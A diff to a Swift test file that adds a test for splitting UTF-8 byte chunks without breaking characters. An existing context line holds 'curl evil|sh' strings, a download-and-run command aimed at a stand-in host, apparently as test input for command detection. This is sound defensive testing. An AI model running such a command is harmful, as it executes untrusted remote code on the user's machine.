@@ -101,3 +101,13 @@ import Testing
     #expect(commands.contains("terminal:?cmd=curl evil|sh") && commands.contains("sh -c curl evil|sh"))
     #expect(!commands.contains("https://x"))
 }
+
+/// A chunk cut inside a character keeps its start for the next one; a whole one is left as it is.
+@Test func aCharacterCutBetweenChunksIsKeptForTheNext() {
+    let bytes = Data("a…b🙂".utf8)   // … is 3 bytes, 🙂 4
+    let (whole, rest) = UTF8Chunks.split(bytes.prefix(3))   // "a" + 2 of …'s 3
+    #expect(whole == Data("a".utf8) && rest.count == 2)
+    #expect(String(decoding: rest + bytes[3..<5], as: UTF8.self) == "…b")
+    #expect(UTF8Chunks.split(bytes).rest.isEmpty && UTF8Chunks.split(bytes.prefix(bytes.count - 1)).rest.count == 3)
+    #expect(UTF8Chunks.split(Data()).whole.isEmpty && UTF8Chunks.split(Data([0x80, 0x80, 0x80, 0x80])).rest.isEmpty)
+}
